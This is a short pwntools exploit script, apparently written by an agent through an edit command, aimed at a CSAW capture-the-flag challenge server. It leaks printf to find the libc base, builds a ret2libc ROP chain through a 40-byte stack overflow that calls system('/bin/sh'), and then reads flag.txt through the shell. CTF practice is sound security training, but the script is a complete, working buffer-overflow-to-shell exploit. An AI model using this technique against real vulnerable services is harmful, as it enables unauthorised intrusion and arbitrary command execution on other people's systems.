edit 1:1
from pwn import *

context.log_level = 'info'

libc = ELF('libc-2.27.so')
p = remote('pwn.chal.csaw.io', 8000)

p.recvuntil(b'Hello!\n')
leak_line = p.recvline()
printf_leak = int(leak_line.split(b'Here I am: ')[1].strip(), 16)
log.info('printf leak: %#x' % printf_leak)

libc_base = printf_leak - libc.symbols['printf']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
log.info('libc base: %#x  system: %#x  binsh: %#x' % (libc_base, system, binsh))

pop_rdi = 0x400793
ret = 0x400794

payload = b'A' * 40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.sendline(b'cat flag.txt; echo DONE_MARKER')
print(p.recvall(timeout=5).decode('latin-1'))
end_of_edit

